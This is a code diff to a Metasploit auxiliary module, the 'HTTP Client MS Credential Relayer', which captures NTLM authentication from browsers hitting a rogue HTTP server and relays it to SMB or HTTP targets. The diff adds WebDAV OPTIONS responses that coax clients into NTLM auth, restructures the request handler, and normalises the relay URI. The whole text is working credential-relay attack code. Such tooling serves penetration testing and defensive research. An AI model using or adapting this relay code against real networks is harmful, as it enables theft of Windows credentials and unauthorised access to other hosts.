@@ -35,7 +35,6 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'        => 'HTTP Client MS Credential Relayer',
-			'Version'     => '$Revision:$',
 			'Description' => %q{
 					This module relays negotiated NTLM Credentials from an HTTP server to multiple
 					protocols. Currently, this module supports relaying to SMB and HTTP.
@@ -52,7 +51,6 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					'Rich Lundeen <richard.lundeen[at]gmail.com>',
 				],
-			'Version'     => '$Revision:$',
 			'License'     => MSF_LICENSE,
 			'Actions'     =>
 				[
@@ -94,42 +92,64 @@ class Metasploit3 < Msf::Auxiliary
 	# Handles the initial requests waiting for the browser to try NTLM auth
 	def on_request_uri(cli, request)
 
-		datastore['REQUEST_IP'] = cli.peerhost
-		cli.keepalive = true;
+		case request.method
+		when 'OPTIONS'
+			process_options(cli, request)
+		else
+			datastore['REQUEST_IP'] = cli.peerhost
+			cli.keepalive = true;
 
-		# If the host has not started auth, send 401 authenticate with only the NTLM option
-		if(!request.headers['Authorization'])
-			response = create_response(401, "Unauthorized")
-			response.headers['WWW-Authenticate'] = "NTLM"
-			response.headers['Proxy-Support'] = 'Session-Based-Authentication'
+			# If the host has not started auth, send 401 authenticate with only the NTLM option
+			if(!request.headers['Authorization'])
+				response = create_response(401, "Unauthorized")
+				response.headers['WWW-Authenticate'] = "NTLM"
+				response.headers['Proxy-Support'] = 'Session-Based-Authentication'
 
-			response.body =
-				"<HTML><HEAD><TITLE>You are not authorized to view this page</TITLE></HEAD></HTML>"
+				response.body =
+					"<HTML><HEAD><TITLE>You are not authorized to view this page</TITLE></HEAD></HTML>"
 
-			cli.send_response(response)
-			return false
+				cli.send_response(response)
+				return false
+			end
+			method,hash = request.headers['Authorization'].split(/\s+/,2)
+			# If the method isn't NTLM something odd is goign on.
+			# Regardless, this won't get what we want, 404 them
+			if(method != "NTLM")
+				print_status("Unrecognized Authorization header, responding with 404")
+				send_not_found(cli)
+				return false
+			end
+
+			print_status("NTLM Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")
+
+			if (datastore['SYNCFILE'] != nil)
+				sync_options()
+			end
+
+			handle_relay(cli,hash)
 		end
-		method,hash = request.headers['Authorization'].split(/\s+/,2)
-		# If the method isn't NTLM something odd is goign on.
-		# Regardless, this won't get what we want, 404 them
-		if(method != "NTLM")
-			print_status("Unrecognized Authorization header, responding with 404")
-			send_not_found(cli)
-			return false
-		end
-
-		print_status("NTLM Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")
-
-		if (datastore['SYNCFILE'] != nil)
-			sync_options()
-		end
-
-		handle_relay(cli,hash)
 	end
 
 	def run
 		parse_args()
 		exploit()
+	end
+
+	def process_options(cli, request)
+		print_status("OPTIONS #{request.uri}")
+		headers = {
+			'MS-Author-Via' => 'DAV',
+			'DASL'          => '<DAV:sql>',
+			'DAV'           => '1, 2',
+			'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
+			'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',
+			'Cache-Control' => 'private'
+		}
+		resp = create_response(207, "Multi-Status")
+		headers.each_pair {|k,v| resp[k] = v }
+		resp.body = ""
+		resp['Content-Type'] = 'text/xml'
+		cli.send_response(resp)
 	end
 
 	#The call to handle_relay should be a victim HTTP type 1 request
@@ -278,7 +298,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		opts = {
-		'uri'     => datastore['RURIPATH'],
+		'uri'     => normalize_uri(datastore['RURIPATH']),
 		'method'  => method,
 		'version' => '1.1',
 		}
